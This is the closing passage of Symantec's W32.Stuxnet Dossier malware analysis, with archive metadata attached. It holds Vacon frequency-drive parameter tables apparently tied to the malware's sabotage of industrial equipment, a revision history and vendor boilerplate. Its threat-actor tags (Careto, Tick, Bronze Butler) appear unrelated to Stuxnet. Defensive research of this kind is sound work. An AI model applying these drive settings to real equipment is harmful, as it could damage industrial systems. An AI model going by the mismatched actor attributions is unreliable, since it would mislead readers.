selection|\n|307|0|analogue output function|\n|471|0|Analogue output 2 signal selection|\n|472|0|Analogue output 2 function|\n|478|0|Analogue output 3/ signal selection|\n|479|0|Analogue output 3/ function|\n|312|0|digital output 1 function|\n|486|0|Digital output 1 signal selection|\n|490|0|Digital output 2 function|\n|489|0|Digital output 2 signal selection|\n|414|0|fault reset|\n|415|0|acc/dec prohibited|\n|416|0|DC-braking|\n|750|1|Cooling monitor|\n|1213|1|Emergency Stop (allinone)|\n|1420|1|Prevention of startup (allinone)|\n|607|0|Overvoltage controller|\n|1267|850|Brake chopper level (advanced)|\n|1262|2|Overvoltage reference selection (ad­ vanced)|\n|520|0|Flux brake|\n|1522|0|Analogue output 4 inversion (advanced)|\n|1526|0|DIN5 function (highspeed multimotor)|\n|1525|0|Analogue output 4 scaling (advanced)|\n|516|0|DC-braking time at start|\n|508|0|DC-braking time at stop|\n|515|1||\n|505|0|start function|\n|104|1|deceleration time 1|\n|503|1|deceleration time 2|\n\n\n-----\n\n|Table 15|Col2|Col3|\n|---|---|---|\n|Parameters and values for Vacon drive|||\n|Parameter|Value|Possible Description|\n|1541|1|Selma Fault Word 1 - ?|\n|1542|1|Selma Fault Word 2 - ?|\n|1531|0|Min frequency (highspeed multimotor)|\n|1532|0|Max frequency (highspeed multimotor)|\n|125|3|control place|\n|601|160|switching frequency|\n|399|0|scaling of current limit|\n|400|0|scaling of DC breaking current|\n|401|0|scaling of acc/dec time|\n|405|0|external fault close|\n|406|1|external fault open|\n|407|1|run enable|\n|411|1|control from fieldbus|\n|409|0|control from I/O terminal|\n|410|0|control from keyboard|\n|600|0|Motor control mode|\n|521|0|Motor control mode 2|\n|108|2|U/f ratio selection|\n|101|0|min frequency|\n|107|44|current limit|\n|107|440|current limit|\n|110|380|nominal voltage of motor|\n|606|2800|output voltage at zero frequency|\n|111|80||\n|112|144|nominal speed of motor|\n|120|85|motor cos phi|\n|605|2850|U/f curve/ middle point voltage|\n|603|3000|voltage at field weakening point|\n|604|40||\n|1519|1||\n|102|2||\n|717|110|Automatic restart/ Wait time|\n|718|120|Automatic restart/ Trial time|\n|721|10|Automatic restart/ Number of tries after overvoltage trip|\n|722|3|Automatic restart/ Number of tries after overcurrent trip|\n|301|0|DIN3 function|\n|313|0|RO1 function|\n|314|0|RO2 function|\n|103|3000|acceleration time 1|\n\n\n502 3000 acceleration time 2\n\n\n-----\n\n|Table 15|Col2|Col3|\n|---|---|---|\n|Parameters and values for Vacon drive|||\n|Parameter|Value|Possible Description|\n|1502|3000|Maximum frequency (highspeed mul­ timotor) ?|\n|104|19990|deceleration time 1 ?|\n|503|19990|deceleration time 2 ?|\n|1541|19990|Selma Fault Word 1 - ?|\n|1542|19990|Selma Fault Word 2 - ?|\n|504|1|brake chopper|\n|504|4|brake chopper|\n|1531|1|Min frequency (highspeed multimotor)|\n|0|0||\n|0|0||\n|506|1|stop function|\n|0|0||\n|Frames 2.2|||\n|506|0|stop function|\n|1532|0|Max frequency (highspeed multimotor)|\n|1541|1|Selma Fault Word 1 - ?|\n|1542|1|Selma Fault Word 2 - ?|\n|104|1|deceleration time 1|\n|503|1|deceleration time 2|\n|1522|0|Analogue output 4 inversion (advanced)|\n|1526|0|DIN5 function (highspeed multimotor)|\n|1525|0|Analogue output 4 scaling (advanced)|\n|125|3|control place|\n|1531|0|Min frequency (highspeed multimotor)|\n|0|0||\n|0|0||\n|0|0||\n|102|1064||\n|108|2|U/f ratio selection|\n|111|1064||\n|604|50||\n|603|10000|voltage at field weakening point|\n|605|1000|U/f curve/ middle point voltage|\n|606|330|output voltage at zero frequency|\n|0|0||\n|812|12|?|\n|1531|1|Min frequency (highspeed multimotor)|\n|516|0|DC-braking time at start|\n|505|0|start function|\n|103|1|acceleration time 1|\n\n\n-----\n\n|Table 15|Col2|Col3|\n|---|---|---|\n|Parameters and values for Vacon drive|||\n|Parameter|Value|Possible Description|\n|502|1|acceleration time 2|\n|1502|1|Maximum frequency (highspeed mul­ timotor)|\n|1522|0|Analogue output 4 inversion (advanced)|\n|1526|0|DIN5 function (highspeed multimotor)|\n|1525|0|Analogue output 4 scaling (advanced)|\n|0|0||\n|0|0||\n|812|12|?|\n|0|0||\n\n\n-----\n\n### Revision History\n\n#### Version 1.0 (September 30, 2010)\n\n     - Initial publication\n\n#### Version 1.1 (October 12, 2010)\n\n     - Added Windows Win32k.sys Local Privilege Escalation (MS10-073) section.\n\n     - Updates to Modifying PLCs section, based on MS10-073.\n\n     - Other minor updates.\n\n#### Version 1.2 (November 3, 2010)\n\n     - Added Behavior of a PLC infected by sequence A/B section.\n\n#### Version 1.3 (November 12, 2010)\n\n     - Updated the Modifying PLCs section.\n\n     - Added Appendix C.\n\n#### Version 1.4 (February 11, 2011)\n\n     - New content added to the Infection Statistics, The monitor thread, Sequence C, and Variants sections.\n\n     - Minor edits and updates to Configuration Data Block, Behavior of a PLC infected by sequence A/B, and Other\nexport hooks sections.\n\n\n-----\n\nAny technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec\nCorporation.\n\nNO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use of the\ntechnical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical\nerrors. Symantec reserves the right to make changes without prior notice.\n\n\ntechnical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical\nerrors. Symantec reserves the right to make changes without prior notice.\n\n**About Symantec**\nSymantec is a global leader in\nproviding security, storage and\nsystems management solutions to\n\n\n**About the authors**\nNicolas Falliere is a Senior Software Engineer,\nLiam O Murchu is a Development Manager,\nand Eric Chien is a Technical Director\nwithin Symantec Security Response.\n\nFor specific country offices and contact num­\nbers, please visit our Web site. For product\ninformation in the U.S., call\ntoll-free 1 (800) 745 6054.\n\n\nSymantec Corporation\n\nWorld Headquarters\n20330 Stevens Creek Blvd.\n\nCupertino, CA 95014 USA\n\n+1 (408) 517 8000\n\n1 (800) 721 3934\nwww.symantec.com\n\n\nhelp businesses and consumers\nsecure and manage their information.\n\nHeadquartered in Cupertino, Calif.,\n\nSymantec has operations in more\nthan 40 countries. More information\n\nis available at www.symantec.com.\n\nCopyright © 2011 Symantec Corporation. All rights reserved.\nSymantec and the Symantec logo are trademarks or registered\n\ntrademarks of Symantec Corporation or its affiliates in the\nU.S. and other countries. Other names may be trademarks of\n\ntheir respective owners.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/rpdy3pk00bmkhgmf1lsfuwt6edakh6k3",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2010/2010.09.30.W32.Stuxnet_Dossier/w32_stuxnet_dossier.pdf"
    ],
    "report_names": [
        "w32_stuxnet_dossier"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "dfee8b2e-d6b9-4143-a0d9-ca39396dd3bf",
            "created_at": "2022-10-25T16:07:24.467088Z",
            "updated_at": "2025-03-27T02:02:10.241387Z",
            "deleted_at": null,
            "main_name": "Circles",
            "aliases": [],
            "source_name": "ETDA:Circles",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1310401017,
    "ts_modification_date": 1310401076,
    "files": {
        "pdf": "https://archive.orkl.eu/93c9ad9c9d9e1d882d56d8ceb1aa684d147d0a78.pdf",
        "text": "https://archive.orkl.eu/93c9ad9c9d9e1d882d56d8ceb1aa684d147d0a78.txt",
        "img": "https://archive.orkl.eu/93c9ad9c9d9e1d882d56d8ceb1aa684d147d0a78.jpg"
    }
}